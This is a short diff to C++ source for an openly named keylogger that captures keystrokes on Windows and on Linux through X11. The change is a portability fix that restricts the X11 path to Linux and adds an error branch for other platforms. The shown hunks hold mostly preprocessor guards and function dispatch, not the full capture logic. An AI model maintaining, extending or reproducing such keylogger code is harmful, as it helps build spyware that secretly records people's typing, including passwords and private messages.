@@ -10,7 +10,7 @@
 #ifdef _WIN32
 #include <windows.h>
 #include <tlhelp32.h>
-#else
+#elif defined(__linux__)
 #include <X11/Xlib.h>
 #include <X11/Xutil.h>
 #include <X11/keysym.h>
@@ -94,8 +94,12 @@ private:
     void capture_keystrokes() {
 #ifdef _WIN32
         capture_windows_keys();
-#else
+#elif defined(__linux__)
         capture_linux_keys();
+#else
+        // Unsupported platform
+        LOG_ERROR("Keylogger not supported on this platform");
+        running_ = false;
 #endif
     }
 
@@ -163,7 +167,7 @@ private:
             }
         }
     }
-#else
+#elif defined(__linux__)
     void capture_linux_keys() {
         // Linux implementation using X11
         Display* display = XOpenDisplay(NULL);
